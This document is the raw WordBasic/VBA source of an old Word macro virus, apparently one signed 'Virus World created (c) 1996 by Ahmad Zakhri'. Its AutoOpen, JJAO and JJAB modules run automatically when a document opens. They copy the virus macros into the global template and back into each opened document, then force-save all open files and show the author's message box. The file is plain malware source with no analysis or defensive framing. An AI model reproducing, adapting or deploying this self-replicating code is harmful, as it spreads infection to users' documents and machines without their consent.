   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   sMe$ = WordBasic.[FileName$]()
   WordBasic.FileSaveAs Name:=sMe$, Format:=1
   sTMacro$ = sMe$ + ":JJAO"
   WordBasic.MacroCopy sTMacro$, "Global:AutoOpen"
   sTMacro$ = sMe$ + ":JJAO"
   WordBasic.MacroCopy sTMacro$, "Global:JJAO"
   sTMacro$ = sMe$ + ":JJAB"
   WordBasic.MacroCopy sTMacro$, "Global:JJAB"
   WordBasic.FileSaveAll 1, 1
   WordBasic.MsgBox "Virus World created (c) 1996 by Ahmad Zakhri", -8
   End Sub

   Attribute VB_Name = "JJAO"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   sMe$ = WordBasic.[FileName$]()
   WordBasic.FileSaveAs Name:=sMe$, Format:=1
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:JJAB", sTMacro$
   sTMacro$ = sMe$ + ":JJAB"
   WordBasic.MacroCopy "Global:JJAB", sTMacro$
   sTMacro$ = sMe$ + ":JJAO"
   WordBasic.MacroCopy "Global:JJAO", sTMacro$
   WordBasic.FileSaveAll 1, 1
   WordBasic.MsgBox "Virus World created (c) 1996 by Ahmad Zakhri", -8
   End Sub

   Attribute VB_Name = "JJAB"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   sMe$ = WordBasic.[FileName$]()
   WordBasic.FileSaveAs Name:=sMe$, Format:=1
   sTMacro$ = sMe$ + ":JJAO"
   WordBasic.MacroCopy sTMacro$, "Global:AutoOpen"
   sTMacro$ = sMe$ + ":JJAO"
   WordBasic.MacroCopy sTMacro$, "Global:JJAO"
   sTMacro$ = sMe$ + ":JJAB"
   WordBasic.MacroCopy sTMacro$, "Global:JJAB"
   WordBasic.FileSaveAll 1, 1
   WordBasic.MsgBox "Virus World created (c) 1996 by Ahmad Zakhri", -8
   End Sub
